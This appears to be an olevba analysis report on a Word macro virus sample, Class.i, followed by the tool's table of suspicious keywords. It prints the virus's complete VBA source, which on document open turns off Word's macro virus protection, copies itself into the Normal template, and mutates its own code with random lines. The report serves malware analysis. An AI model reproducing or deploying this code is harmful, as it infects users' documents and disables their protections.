olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.i
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Class.i 
in file: Virus.MSWord.Class.i - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Sub AutoOpen()

On Error GoTo out

Options.VirusProtection = False

Options.SaveNormalPrompt = False

ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If nt > 40 And ad > 0 Then GoTo out

If nt < 40 Then

    Set host = NormalTemplate.VBProject.VBComponents.Item(1)

    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name

    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines (ad + 1), "' I infected " & Application.UserName & " on: " & Now

    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\" & Application.UserInitials

End If

If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)

host.CodeModule.AddFromFile ("c:\" & Application.UserInitials)

host.CodeModule.deletelines 1, 4

If nt < 40 Then host.CodeModule.replaceline 1, "Sub AutoClose()"

With host.CodeModule

    For x = 2 To 48 Step 2

    .replaceline x, (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 200) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200)

    Next x

End With

out:

If nt > 40 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

' Class.Poppy.Gold Infection Log
' ------------------------------
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

